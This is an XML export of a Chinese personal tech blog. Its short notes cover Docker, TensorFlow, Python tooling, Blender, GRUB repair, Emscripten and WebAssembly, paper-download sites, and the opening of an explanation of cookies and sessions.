    <content type="text"><![CDATA[Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。 Docker与传统虚拟机如virtualbox、vmware相比，占用资源少，更加轻便，启动快，更适用于解决软件环境配置难题。 基本概念 镜像 Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。 容器 镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。 仓库 镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry 就是这样的服务。 一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。 通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 &lt;仓库名&gt;:&lt;标签&gt; 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。 使用方法操作镜像获取镜像Docker Hub 上有大量的高质量的镜像可以用，使用docker pull命令拉取镜像。1234// 拉取镜像$ docker pull ubuntu:16.04// 以该镜像启动容器$ docker run -it --rm ubuntu:16.04 bash docker run 就是运行容器的命令,其参数含义如下： -it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。 —rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。 ubuntu:16.04：这是指用 ubuntu:16.04 镜像为基础来启动容器。 bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 bash。 列出镜像1docker image ls 删除镜像删除本地镜像格式如下：1docker image rm [选项] &lt;镜像1&gt; [&lt;镜像2&gt; ...] 以删除hello-world镜像为例：1docker image rm hello-world 操作容器启动容器1234// 新建并启动容器docker run ubuntu:14.04 /bin/echo &apos;Hello world&apos;// 启动已终止容器docker container start 后台运行1234567// 后台运行容器$ docker run -d ubuntu:17.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;// 通过 docker container ls 命令来查看容器信息$ docker container ls// 通过 docker container logs 命令获取容器的输出信息$ docker container logs [container ID or NAMES] 终止容器1docker container stop 进入容器在使用 -d 参数时，容器启动后会进入后台。 某些时候需要进入容器进行操作，包括使用 docker attach 命令或 docker exec 命令，推荐大家使用 docker exec 命令。1234$ docker run -dit ubuntu$ docker container ls$ docker exec -i 69d1 bash$ docker exec -it 69d1 bash 如果从这个 stdin 中 exit，不会导致容器的停止。这就是为什么推荐大家使用 docker exec 的原因。 删除容器12345// 删除一个处于终止状态的容器$ docker container rm trusting_newton// 清理所有处于终止状态的容器docker container prune 参考文献 https://yeasy.gitbooks.io/docker_practice/introduction/what.html http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html ，by 阮一峰 https://zh.wikipedia.org/wiki/Docker ,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debian_Linux下安装Docker的方法]]></title>
    <url>%2F2018%2F10%2F18%2FDebian-Linux%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。 Docker利用Linux核心中的资源分离机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免启动一个虚拟机造成的额外负担。Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网上、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、存储器、block I/O与网上。 下面即记录在Debian Linux下按照Docker社区版的方法。 前期准备添加Docker的pgp key。1curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - 配置Docker的Apt仓库。1echo &apos;deb https://download.docker.com/linux/debian stretch stable&apos; | sudo tee /etc/apt/sources.list.d/docker.list 更新Apt仓库1sudo apt-get update 安装Docker123456// 清除之前安装的Docker版本apt-get remove docker docker-engine docker.io// 在安装最新的Docker社区版apt-get install docker-ce// 测试dockerdocker run hello-world 以非root用户管理docker12sudo groupadd dockersudo usermod -aG docker $USER 参考文献 https://zh.wikipedia.org/wiki/Docker ,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tensorflow学习笔记]]></title>
    <url>%2F2018%2F10%2F14%2Ftensorflow%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[TensorFlow™ 是一个开放源代码软件库，用于进行高性能数值计算。借助其灵活的架构，用户可以轻松地将计算工作部署到多种平台（CPU、GPU、TPU）和设备（桌面设备、服务器集群、移动设备、边缘设备等）。TensorFlow™ 最初是由 Google Brain 团队（隶属于 Google 的 AI 部门）中的研究人员和工程师开发的，可为机器学习和深度学习提供强力支持，并且其灵活的数值计算核心广泛应用于许多其他科学领域。 tensorflow入门tensorflow实现机器学习的基本步骤如下： 定义模型，建立数据流图 定义loss，并指定优化器 传入数据并进行训练 使用测试集进行评测 通用代码框架1234567891011121314151617181920212223242526272829303132333435363738394041424344import tensorflow as tf# 初始化变量和模型参数，定义训练闭环中的运算def inference(X): # 计算推断模型在数据X上的输出，并将结果返回def loss(X,Y): # 依据训练数据X及其期望输出Y计算损失def inputs(): # 读取或生成训练数据X及其期望输出Ydef train(total_loss): # 依据计算的总损失训练或调整模型参数def evaluate(sess,X,Y): # 对训练得到的模型进行评估# 在一个会话对象中启动数据流图，搭建流程with tf.Session() as sess: tf.initialize_all_variables().run() X,Y=inputs() total_loss=loss(X,Y) train_op=train(total_loss) coord=tf.train.Coordinator() threads=tf.train.start_queue_runners(sess=sess,coord=coord) # 实际的训练迭代次数 training_steps=1000 for step in range(training_steps): sess.run([train_op]) # 出于调试和学习的目的，查看损失在训练过程中递减的情况 if step % 10 =0: print &quot;loss: &quot;,sess.run([total_loss]) evaluate(sess,X,Y) coord.request_stop() coord.join(threads) sess.close() 保存训练检查点借助tf.train.Saver类可创建检查点文件，将数据流图中变量保存至其中。修改后框架如下：1234567891011121314151617181920# 模型定义代码# 创建一个Saver对象saver=tf.train.Saver()# 在会话对象中启动数据流图，搭建流程with tf.Session() as sess: # 模型设置 # 实际的训练闭环 for step in range(training_steps): sess.run([train_op]) if step % 1000 ==0 # 将创建遵循命名模板为my-model-&#123;step&#125;的检查点文件，默认保存最近的5个文件 saver.save(sess,&apos;my-model&apos;,global_step=step) # 模型评估 saver.save(sess,&apos;my-model&apos;,global_step=training_steps) sess.close() 如果希望从检查点恢复，则使用tf.train.get_checkpoint_state方法验证检查点文件的存在，并使用tf.train.Saver.restore方法恢复变量值。123456789101112131415with tf.Session() as sess: # 模型设置 initial_step=0 # 验证之前是否已经保存了检查点文件 ckpt=tf.train.get_checkpoint_state(os.path.dirname(__file__)) if ckpt and ckpt.model_checkpoint_path: # 从检查点恢复模型参数 saver.restore(sess,ckpt.model_checkpoint_path) initial_step=int(ckpt.model_checkpoint_path.rsplite(&apos;_&apos;,1)[1]) # 实际的训练闭环 for step in range(initial_step, training_steps): ... 参考文献 https://www.tensorflow.org/?hl=zh-cn . 面向机器智能的TensorFlow实践, by Sam Abrahams, Danijar Hafner,etc.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python常用库简介]]></title>
    <url>%2F2018%2F10%2F14%2FPython%E5%B8%B8%E7%94%A8%E5%BA%93%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Python的高效开发建立在大量常用库基础上，因此掌握常用的Python库十分必要。下面简单介绍Python的各类常用库。 常用标准库 os： 访问操作系统功能模块 sys： 访问一些环境变量和与 Python 解释器交互 datetime： 日期时间处理 collections： 高级数据结构，有序字典，队列等等 uuid： 生成 UUID 模块 random： 随机数生成模块 re： 正则表达式模块 json： JSON 处理模块 pdb： 单步调试模块 科学计算 scipy：基于Python的matlab实现，旨在实现matlab的所有功能。包含Numpy、Ipython、Pandas、Matplotlib、Sympy等常用库 numpy： 基于Python的科学计算第三方库，提供了矩阵，线性代数，傅立叶变换等等的解决方案 pandas： 支持表格等多维数据 matplotlib： 用Python实现的类matlab的第三方库，用以绘制一些高质量的数学二维图形 命令交互 ipython： 交互命令行，适合科学计算 jupyter： ipython notebook 的延伸，可以直接放在github上 argparse：(Python 标准库)用于命令项选项与参数解析的模块 爬虫相关 urllib: (Python 标准库)，接受URL请求的相关模块 http: (Python 标准库)，处理所有客户端—服务器http请求的具体细节 requests: 第三方库，人性化的HTTP请求库，比urllib更好用 pillow: 处理验证码 rsa: 处理加密问题 BeautifulSoup：解析html文档为用户提供需要抓取的数据 lxml: 是基于 libxml2 这一 XML 解析库的 Python 封装,解析速度比 Beautiful Soup 更快 环境管理 virtualenv：创建独立 Python 环境的工具 virtualenvwrapper：virtualenv 的一组扩展 包管理 pip：Python 包和依赖关系管理工具 conda：跨平台，Python 二进制包管理工具 并发和并行 threading：(Python 标准库)更高层的线程接口 multiprocessing：(Python 标准库) 基于进程的“线程”接口 日志 logging：(Python 标准库) 为 Python 提供日志功能。 兼容性 six：Python 2 和 3 的兼容性工具 计算机视觉 opencv 机器学习 tensorflow 参考文献 Python 笔记四：Python的常用库收集, by brandonxiang]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Virtualenv简易教程]]></title>
    <url>%2F2018%2F10%2F09%2FVirtualenv%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[virtualenv是一个创建隔离python环境的工具，主要用于解决包冲突问题。 安装方法1sudo pip3 install virtualenv 使用方法创建项目的虚拟环境12$ cd my_project_folder$ virtualenv venv #venv是虚拟环境名称 执行上述命令后，将生成一个与虚拟环境同名的文件夹，包含 Python 可执行文件和 pip 库的拷贝，可用于安装其他包。 但是默认情况下，虚拟环境中不会包含也无法使用系统环境的global site-packages。比如系统环境里安装了 requests 模块，在虚拟环境里import requests会提示ImportError。如果想使用系统环境的第三方软件包，可以在创建虚拟环境时使用参数–system-site-packages。如下所示：1virtualenv --system-site-packages venv 此外可以指定虚拟环境所使用的 Python 版本，但前提是系统中已经安装了该版本：1virtualenv -p /usr/bin/python2.7 venv 使用虚拟环境启动虚拟环境：123cd venvsource bin/activate python -V 退出虚拟环境：1deactivate virtualenvwrappervirtualenvwrapper是virtualenv 的扩展工具，提供了一系列命令行命令，可以方便地创建、删除、复制、切换不同的虚拟环境。同时，使用该扩展后，所有虚拟环境都会被放置在同一个目录下。 安装方法1pip3 install virtualenvwrapper 环境配置在$home/.bashrc文件中添加如下几行代码：12345# bash -f file检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 trueif [ -f /usr/local/bin/virtualenvwrapper.sh ]; then export WORKON_HOME=$HOME/.virtualenvs source /usr/local/bin/virtualenvwrapper.shfi 使用方法mkvirtualenv 也可以使用 virtualenv 的参数，比如 –python 来指定 Python 版本。123456789101112131415mkvirtualenv venv # 创建虚拟环境，虚拟环境目录都在 WORKON_HOME 里lsvirtualenv -b # 列出虚拟环境workon [虚拟环境名称] # 切换虚拟环境lssitepackages # 查看环境里安装了哪些包cdvirtualenv [子目录名] # 进入当前环境的目录cpvirtualenv [source] [dest] # 复制虚拟环境deactivate # 退出虚拟环境rmvirtualenv [虚拟环境名称] # 删除虚拟环境 conda vs. pip vs. virtualenvConda是一个开源包管理系统和环境管理系统，用于安装多个版本的软件包及其依赖关系，并在它们之间轻松切换。 它适用于Linux，OS X和Windows，是为Python程序创建的，但可以打包和分发任何软件。 Pip是一个以Python计算机程序语言写成的软件包管理系统，用于安装和管理软件包。 它们直接的区别如下： pip使用方法1234# 导出python安装包环境pip freeze &gt; requirements.txt# 导入requirements文件pip install -r requirements.txt 参考文献 http://codingpy.com/article/virtualenv-must-have-tool-for-python-development/. https://conda.io/docs/commands.html#conda-vs-pip-vs-virtualenv-commands.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Blender简易教程]]></title>
    <url>%2F2018%2F09%2F19%2FBlender%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[最近需要用Blender建3D模型，试用了半天，将经验简单总结一下。 3D建模流程 建立3D模型：通常在Blender的3D视图窗口对物体进行建模。 拆分制作纹理：设置缝合边，再展开。打开U/V图像编辑器窗口即可看到拆分效果。导出图片后制作纹理。 使用材质贴图：设置材质着色，添加纹理。 Blender快捷键Blender快捷键很多，熟练使用可加速3D模型的建立。 3D视图窗口字母键 A：全选、取消选择 Shift+A：增加物件，新建的物件会出现在准星的位置 B：框选，加Shift取消选择，按Esc退出选择 C：刷选，加Shift取消选择，按Esc退出选择 Shift+C：将游标设置到坐标系中心 Ctrl+Shift+C：为骨头添加约束 Shift+D：复制对象 E：挤出选中对象 Shift+E：编辑模式下，打开对称镜像挤出骨架 F：编辑模式下，在点的基础上构建边或面；在权重绘制模式下，设置笔刷大小 G：移动选中对象 Alt+G: 在Pose Mode下，按“Alt+G”骨架归位 H：隐藏对象（Hide） Alt+H：显示对象 I：增加关键帧 Shift+I：在Pose Mode下，选中骨架，再按“Shift+I”插入反关节 Ctrl+J: 在Pose Mode下，连接两个独立的骨架，以便在编辑模式下同时编辑；在Object Mode下，选择两个物件后合并 K: 切割,按“enter”键完成切割。按“k”键接着按住“ctrl”键移动到线框上可以自动定位到线的二分之一处。按“k”键接着按一下“c”键可以水平垂直或者45度进行切割。按“k”键接着按一下“z”键可以对物体一圈进行切割。 Ctrl+L：编辑模式下，选择一个点，在Ctrl+L将选择与点相连的连续表面 M：选中物体，按“M”键，再选择要将物体放置的图层。 N：打开物体属性 Ctrl+P：编辑模式下，设置多个骨头的父骨头。 R: 旋转 Alt+R: 在Pose Mode下，按“Alt+R”骨架归位 Ctrl+R: 环切并滑动 S: 缩放 S+XYZ：沿XYZ轴方向缩放 Alt+S：法向缩放 T：打开左侧工具栏 U：编辑模式下按“U”，打开UV映射菜单,选择活动面再全选，然后UV展开 Ctrl+U:存储为启动文件 W：快捷拓展命令栏 X：删除 Z：线框模式与实体模式之间切换 Shift+Z：视口着色切换到实时渲染模式 ]：在Pose模式下，选择主骨头，再按“]”可直接选择下一根骨头 Shift+]：在Pose模式下，选择主骨头，再按“Shift+]”可直接选择下一根骨头 Ctrl+Space：调出三维坐标系操纵物体 Ctrl+Tab：进行点、线、面的编辑模式 Ctrl+Alt+Q：切换四视图 Ctrl+向上箭头：最大化对应视图 Shift+空格键：放大视图 Tab：编辑模式和物体模式切换 功能键 F12：计算结果（算图模式），如果是黑色的，需要把摄像机和光源放在同一个图层中，或者选择摄像机和光源的图层。 数字键数字键主要用于视角切换 1：前视图 3：侧视图 5：正交与透视之间切换 7：俯视图 鼠标键 右键：选择物体 shift+中键：平移 滚轴/（Ctrl+中键拖拽）：缩放 参考文献 Blender常用快捷键,by JinunMeng. 如何系统的学习blender？,by zhihu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下将cmd命令添加到右键菜单]]></title>
    <url>%2F2018%2F09%2F11%2FWindows%E4%B8%8B%E5%B0%86cmd%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0%E5%88%B0%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%2F</url>
    <content type="text"><![CDATA[经常需要使用cmd命令，如果打开cmd窗口后在cd到目标路径，则非常麻烦。可使用如下方法将cmd添加到右键菜单，这样一打开cmd窗口就到了目标路径。设置方法如下： 打开注册表 添加注册项123a) 找到[HKEY_CLASSESS_ROOT\Folder\shell]子键，在其下新建“cmdPrompt”子项，在窗口右侧名称列上点击右键修改，将数值数据改为“CMD快速通道”。b) 再在这个项下，新建名为“command”子项，同样修改数值数据修改为c:\windows\system32\cmd.exe /k cd &quot;%1&quot; 设置完成后即可在目标路径文件夹上右键单击，选择“CMD快速通道”命令，打开cmd窗口的同时，已跳转到目标路径下。]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows平台Python安装与配置教程]]></title>
    <url>%2F2018%2F09%2F07%2FWindows%E5%B9%B3%E5%8F%B0Python%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[下面记录在Windows平台安装配置Python的过程。 去Python官网下载最新的Python3，当前最新版本为3.7。 双击Python3.7的安装包进行安装，设置安装路径为C:\Python\Python37，同时将Python路径加入系统Path变量中。 使用如下命令安装ipython。加参数—trusted-host，否则会报错误：SSLError(SSLCertVerificationError(1, ‘[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed。加参数-i，制定国内pip源，显著提高下载速度。1pip install ipython -i https://pypi.tuna.tsinghua.edu.cn/simple --trusted-host pypi.tuna.tsinghua.edu.cn]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows与Linux双系统Grub引导修复]]></title>
    <url>%2F2018%2F09%2F06%2FWindows%E4%B8%8ELinux%E5%8F%8C%E7%B3%BB%E7%BB%9FGrub%E5%BC%95%E5%AF%BC%E4%BF%AE%E5%A4%8D%2F</url>
    <content type="text"><![CDATA[因为个人爱好，我再笔记本中安装了Windows和Linux的双系统。最近因为Windows系统故障原因，重装Windows系统，导致无法引导Linux启动。 故障原因是之前安装双系统时，先安装Windows，再安装Linux，这样将由Grub2来引导Linux和Windows的启动。而重装Windows的过程中，将覆盖Grub2引导程序，导致无法Linux的启动。 故障解决方法是重新在硬盘中写入Grub2引导程序。具体步骤如下： 使用Linux安装盘，使用Live CD方式进行Linux系统。 使用fdisk -l命令查看硬盘信息。 使用grub-install —root-directory=/media/boot /dev/sda将grub2引导程序写入硬盘。/media/boot为引导分区所在位置，grub-install写入grub2引导程序时需要使用引导分区所在linux映像。 使用update-grub2更新引导配置。]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中文文献免费下载方法]]></title>
    <url>%2F2018%2F08%2F26%2F%E4%B8%AD%E6%96%87%E6%96%87%E7%8C%AE%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[下面记录经过验证可用的中文文献下载方法: idata中国知网 1234idata中国知网网址：https://www.cn-ki.net/进入系统，注册账号，登陆就可以每天免费下载五篇知网论文。额度用完之后，第二天可以继续下载。每天五篇的额度基本能满足需要，这样还不够的话，可以多注册几个账号。 全国图书馆参考咨询联盟 123全国图书馆参考咨询联盟网址：http://www.ucdrs.superlib.net/很全，可以查图书，查期刊，报纸等。还有硕士，博士的毕业论文。不仅有中文，还有外文。网站无需注册，通过文献传递服务，即通过邮箱接收全文。最快一两分钟，最慢三四个小时即可接收到全文。 上海研发公共服务平台 123上海研发公共服务平台网址：http://www.sgst.cn/。注册后可直接下载，论文、文献数量直接匹配知网和万方数据。下载速度较快，但有数量限制，可注册多个用户名。 库问搜索 12库问搜索网址：http://www.koovin.com/。库问搜索提供千万级文献免费下载。]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++跨平台移植开发思考]]></title>
    <url>%2F2018%2F07%2F16%2FCPP%E8%B7%A8%E5%B9%B3%E5%8F%B0%E7%A7%BB%E6%A4%8D%E5%BC%80%E5%8F%91%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[最近需要将一份C++代码通过Emscripten编译成asm.js，结果失败，因为这份C++代码使用MFC GUI库，导致Emscripten编译失败。这引起了我对C++跨平台移植的思考。 C++代码理论上能实现源代码级别的跨平台移植，即同一份代码可以不加修改的在不同的平台上编译运行且表现一致。这要求编写的C++代码符合跨平台移植的规范，如链接[1]所指出的那样，它给出了很多实现C++代码跨平台移植的编码细节，在编写跨平台的底层库方面十分有用。但在编写跨平台的C++应用方面，应使用经过长期实践证明能用的跨平台库来帮助编码，建立在巨人的肩膀上，使跨平台C++代码编写工作变得简单容易。下面给出一些常用的跨平台C++库供参考： 语言及基础库 标准 C++：标准 c++ 是98年制定的，现在主流的 c++ 编译器都能够比较好的支持了。这里建议使用VC7.1和GCC4.0及以上版本。在Linux中，glibc是标准C的实现，libstdc++则是标准C++的实现。在Windows中，VS2015之前MSVCRT.DLL是标准C/C++的实现，之后UCRTBASE.DLLz则是标准C/C++的实现。 boost：boost 则是 C++ 标准委员会的一群人弄起来的一个 C++ 库集合，其中不少库以经进入 C++ TR1，可以说是准标准。使用这里的库我们有着充分的理由。象字符串的操作可以用 boost 的 String algorithms 库，格式化操作可以用 boost::format，正则式可用 boost::regex 等等。 网络 ACE（Adaptive Communication Environment）：ACE是一个以C++的Template技术所做成的开放源代码的可跨平台的网络应用程序的程式库套件。ACE自适配通信环境（ADAPTIVE Communication Environment）是可以自由使用、开放源码的面向对象（OO）框架（Framework），在其中实现了许多用于并发通信软件的核心模式。ACE提供了一组丰富的可复用C++ Wrapper Facade（包装外观）和框架组件，可跨越多种平台完成通用的通信软件任务，其中包括：事件多路分离和事件处理器分派、信号处理、服务初始化、进程间通信、共享内存管理、消息路由、分布式服务动态（重）配置、并发执行和同步，等等。 Boost.Asio：用于网络和底层I/O编程的跨平台的C++库 数据库 OTL (Oracle, Odbc and DB2-CLI Template Library)：不但支持跨平台，还跨数据库。OTL支持以下面的数据库 : OTL Oracle ,SQL Server, Access, MySQL。还有其它的库如DTL，这个库不但支持ODBC，它还支持数据库的原生接口，可以有更佳的性能。 GUI QT：QT是双认证的，当你的程序免费时它就免费，你的程序打算卖钱时，它也要，而且要价很高。所以，如果有版权，成本上的考虑的话，则可以考虑wxWidgets。 wxWidgets：wxWidgets（/wɪksˈwɪdʒɪts/，原名wxWindows）是一个开放源代码且跨平台的对象工具集（widget toolkit），其库可用来创建基本的图形用户界面（GUI）。wxWidgets由Julian Smart于1992年首先开发。 科学计算 GSL：GNU科学库。 游戏开发 Cocos2d-x：一个跨平台框架，用于构建2D游戏，互动图书，演示和其他图形应用程序。 视频 FFmpeg：一个完整的，跨平台的解决方案，用于记录，转换视频和音频流 参考文献 http://hongbomin.com/2017/03/08/cpp-cross-platform-guide/. by 洪柏敏. http://developer.51cto.com/art/201002/181960.htm. by 博客园. https://zh.wikipedia.org/wiki/ACE自适配通信环境. by wikipedia. https://blog.csdn.net/weiwangchao_/article/details/51130863. by 工程师WWW. https://zhuanlan.zhihu.com/p/25443704, by zhihu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Emscripten教程]]></title>
    <url>%2F2018%2F07%2F15%2FEmscripten%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Emscripten是一种基于LLVM的编译器，理论上能够将任何能够生成LLVM位码的代码编译成javascript的严格子集asm.js，实际上主要用于将C/C++代码编译成asm.js。本文主要介绍Emscripten的安装过程。 下载和安装从源码编译安装十分麻烦，推荐安装核心的Emscripten SDK。以Windows为例，先使用如下命令下载emsdk。12345# Get the emsdk repogit clone https://github.com/juj/emsdk.git# Enter that directorycd emsdk 再使用如下命令安装配置Emscripten。1234567891011# Fetch the latest registry of available tools..\emsdk.bat update# Download and install the latest SDK tools. Need install Python first. .\emsdk.bat install latest# Make the &quot;latest&quot; SDK &quot;active&quot; for the current user. (writes ~/.emscripten file).\emsdk.bat activate latest# Activate PATH and other environment variables in the current terminal.\emsdk_env.bat 验证使用如下命令验证Emscripten是否安装配置正确。12345678# Enter that directorycd emsdk# Activate PATH and other environment variables in the current terminal.\emsdk_env.bat# Verifying Emscriptenemcc.bat -v 运行如果验证通过，即可使用Emscripten编译C/C++代码到asm.js。 创建名为helloWorld.cpp的文件，其内容如下：123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;hello, world!\n&quot;); return 0;&#125; 使用如下命令编译：1emcc.bat helloWorld.cpp 编译后将生成a.out.js和a.out.wasm两个文件。后者是包含编译后代码的WebAssembly文件，前者是用于加载和执行后者的Javascipt文件。使用如下命令测试编译后生成的代码，将输出“hello,world!”。1node a.out.js 参考链接 http://kripken.github.io/emscripten-site/docs/introducing_emscripten/about_emscripten.html. by kripken.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器中运行3D游戏的思考]]></title>
    <url>%2F2018%2F07%2F10%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E8%BF%90%E8%A1%8C3D%E6%B8%B8%E6%88%8F%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[Web技术突飞猛进，几乎无所不能，无所不在。然而在3D游戏领域，web技术乏善可陈，性能瓶颈问题制约其发展。但是开发者们没有放弃这个梦想，不断努力，孜孜不倦地改进和增强浏览器中运行3D游戏性能的方法和技术，目前已能看到一丝曙光。 对C/S架构的3D游戏而言，渲染和计算通常都在客户端，服务器端负责用户状态的管理和分发。同样对B/S架构的运行在浏览器中的3D游戏，所有的渲染和计算也应该在浏览器端。如果渲染和计算放在服务器端，将导致可怕的延迟，并严重损害3D游戏的可伸缩性。 当前很多3D游戏使用C/C++语言编写，如果能够将C/C++语言编译成JavaScript语言，可大大促进Web 3D游戏的开发。而编译器项目Emscripten正是一个这样的工具。它能将C/C++代码编译成一种叫做asm.js的Javascript变体。需要指出的是，Emscripten的输入，即C/C++代码最好是开放源代码的，因为Emscripten不支持闭源代码的编译。例如Emscripten不支持mfc程序的转换，因为mfc是闭源的[4]。 asm.js是一个JavaScript的严格子集，它只提供32位带符号整数和64位带符号浮点数两种数据类型，其他Javascript类型如字符串、布尔值等以数值形式存在，保存在内存中，通过TypedArray调用。另外asm.js没有垃圾回收机制，所有内存操作都由程序员自己控制。asm.js是优化后的JavaScript，它在浏览器中的运行速度大约是原生代码的一倍左右[1]。 asm.js虽然比原生javascript运行速度快了一倍左右，但是相比C/C++代码，运行速度还是有差距。幸运的是出现了名为WebAssembly的技术。WebAssembly或称wasm是一个实验性的低级编程语言，应用于浏览器内的客户端[5]。WebAssembly是便携式的抽象语法树，被设计来提供比JavaScript更快速的编译及运行。WebAssembly将让开发者能运用自己熟悉的编程语言（最初以C/C++作为实现目标）编译，再藉虚拟机引擎在浏览器内运行。WebAssembly的开发团队分别来自Mozilla、Google、Microsoft、Apple，代表着四大网络浏览器Firefox、Chrome、Microsoft Edge、Safari。2017年11月，所有以上四个浏览器都开始实验性的支持WebAssembly。目前，最新版本的Emscripten已支持将C/C++代码编译成wasm。 参考文献 http://www.ruanyifeng.com/blog/2017/09/asmjs_emscripten.html. by 阮一峰. https://www.cnblogs.com/slly/p/6639173.html. by 李某龙. http://kripken.github.io/emscripten-site/. by emscripten. https://github.com/kripken/emscripten/issues/941. by emscripten. https://zh.wikipedia.org/wiki/WebAssembly. by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie,Session和Token会话知识整理]]></title>
    <url>%2F2018%2F07%2F08%2FCookie-Session%E5%92%8CToken%E4%BC%9A%E8%AF%9D%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[HTTP是一种无状态的协议，然而当服务器端需要判断用户能否访问某些资源，记录用户的购物车内容等场景时，就需要一种机制维护会话状态，这时候Cookie、Session和Token就派上了用场。 CookieCookie技术最早用于解决HTTP的会话问题， 它是 http 协议的一部分，它的处理分为如下几步： 服务器向客户端发送 cookie。 通常使用 HTTP 协议规定的 set-cookie 头操作。 规范规定 cookie 的格式为 name = value 格式，且必须包含这部分。 浏览器将 cookie 保存。 每次请求浏览器都会将 cookie 发向服务器。 可选的Cookie参数其他可选的 cookie 参数会影响将 cookie 发送给服务器端的过程，主要有以下几种： path：表示 cookie 影响到的路径，匹配该路径才发送这个 cookie。 expires 和 maxAge：告诉浏览器这个 cookie 什么时候过期，expires 是 UTC 格式时间，maxAge 是 cookie 多久后过期的相对时间。当不设置这两个选项时，会产生 session cookie，session cookie 是 transient 的，当用户关闭浏览器时，就被清除。一般用来保存 session 的 session_id。 secure：当 secure 值为 true 时，cookie 在 HTTP 中是无效，在 HTTPS 中才有效。 httpOnly：浏览器不允许脚本操作 document.cookie 去更改 cookie。一般情况下都应该设置这个为 true，这样可以避免被 xss 攻击拿到 cookie。 常用场景当给Cookie设置expires和maxAge后，在未到期前，浏览器端的Cookie不会因为浏览器的关闭而消失。该特性常用于自动登录，记录用户浏览信息。例如很多购物网站常用该特性记录用户的喜好和购买的物品。 Cookie安全隐患Cookie提供了一种手段使得HTTP请求可以附加当前状态， 大多数网站就是靠Cookie来标识用户的登录状态的，例如： 用户提交用户名和密码的表单，这通常是一个POST HTTP请求。 服务器验证用户名与密码，如果合法则返回200（OK）并设置Set-Cookie为authed=true。 浏览器存储该Cookie。 